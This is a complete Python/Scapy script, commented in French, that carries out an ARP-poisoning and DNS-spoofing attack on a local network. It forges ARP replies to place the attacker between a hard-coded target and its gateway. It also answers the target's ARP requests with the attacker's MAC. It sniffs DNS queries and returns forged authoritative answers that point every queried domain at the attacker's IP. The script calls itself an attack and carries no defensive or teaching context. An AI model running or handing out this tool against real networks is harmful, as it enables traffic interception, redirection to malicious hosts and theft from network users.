from scapy.all import *
import sys

TARGET_IP = "192.168.1.100"      
GATEWAY_IP = "192.168.1.1"       # passerelle
MY_IP = "192.168.1.3"            
INTERFACE = "eth0"

def envoyer_empoisonnement_arp():
    send(ARP(op=2, pdst=TARGET_IP, psrc=GATEWAY_IP), verbose=False)
    send(ARP(op=2, pdst=GATEWAY_IP, psrc=TARGET_IP), verbose=False)

def traiter_paquet_dns(packet):
    if packet.haslayer(DNS) and packet[DNS].qr == 0 and packet.haslayer(UDP) and packet.haslayer(DNSQR):
        try:
            nom_domaine = packet[DNSQR].qname.decode('utf-8').strip('.')
            print(f"Requête DNS interceptée pour : {nom_domaine}")
            
            reponse_dns = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                          UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                          DNS(
                              id=packet[DNS].id,
                              qr=1,      # Réponse
                              aa=1,     
                              rd=packet[DNS].rd,
                              qd=packet[DNS].qd,
                              an=DNSRR(
                                  rrname=packet[DNSQR].qname,
                                  type='A',
                                  rclass='IN',
                                  ttl=10,
                                  rdata=MY_IP
                              )
                          )
                          
            send(reponse_dns, verbose=False)
            print(f"Fausse réponse DNS envoyée : {nom_domaine} -> {MY_IP}")
            
        except Exception as e:
            print(f"Erreur DNS : {e}")

def traiter_requete_arp(packet):
    if packet.haslayer(ARP) and packet[ARP].op == 1 and packet[ARP].psrc == TARGET_IP:
        ip_demandee = packet[ARP].pdst
        reponse_arp = ARP(op=2, pdst=TARGET_IP, psrc=ip_demandee, hwsrc=get_if_hwaddr(INTERFACE))
        send(reponse_arp, verbose=False)

def intercepter_paquet(packet):
    traiter_paquet_dns(packet)
    traiter_requete_arp(packet)

def main():
    print("Attaque (ARP + DNS Spoofing) démarrée")
    try:
        while True:
            envoyer_empoisonnement_arp()
            sniff(prn=intercepter_paquet, store=0, timeout=2, iface=INTERFACE)
    except KeyboardInterrupt:
        print("\nArrêt de l'attaque.")
        sys.exit(0)

if __name__ == "__main__":
    main()